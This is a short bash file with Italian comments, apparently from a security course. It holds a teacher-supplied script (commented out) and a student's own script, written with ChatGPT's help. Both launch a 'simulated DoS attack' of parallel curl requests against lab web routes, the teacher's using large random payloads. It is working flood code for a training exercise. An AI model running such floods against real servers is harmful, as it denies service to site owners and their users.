# SCRIPT FORNITO DAL DOCENTE

# #!/bin/bash

# # URL della rotta da attaccare
# URL="http://external.user:8000/articles/search"

# # Generare un grande payload casuale
# LARGE_PAYLOAD=$(head -c 100000 < /dev/urandom | base64)

# # Numero di richieste da inviare
# NUM_REQUESTS=5000

# # Funzione per eseguire la richiesta
# send_request() {
#     curl -G "$URL" --data-urlencode "query=$LARGE_PAYLOAD" > /dev/null 2>&1
# }

# echo "Inizio attacco DoS simulato..."

# # Loop per inviare tante richieste
# for ((i=1; i<=NUM_REQUESTS; i++))
# do
#     send_request &
#     echo "Richiesta $i inviata"
# done

# echo "Attacco DoS simulato completato!"

# --------------------------------------------


# SCRIPT PERSONALE -CON AUSILIO DI CHATPGT

#!/bin/bash

# URL della rotta pubblica di visualizzazione articoli
URL="http://cyber.blog:8000/articles/show/articolo-di-prova"

# Numero di richieste da inviare
NUM_REQUESTS=300

echo "Inizio attacco DoS simulato sulla rotta:"
echo "$URL"
echo "----------------------------------------"

# Funzione per inviare una richiesta HTTP
send_request() {
    curl -s "$URL" > /dev/null 2>&1
}

# Loop per inviare richieste in parallelo
for ((i=1; i<=NUM_REQUESTS; i++))
do
    send_request &
    echo "Richiesta $i inviata"
done

wait
echo "Attacco DoS simulato completato"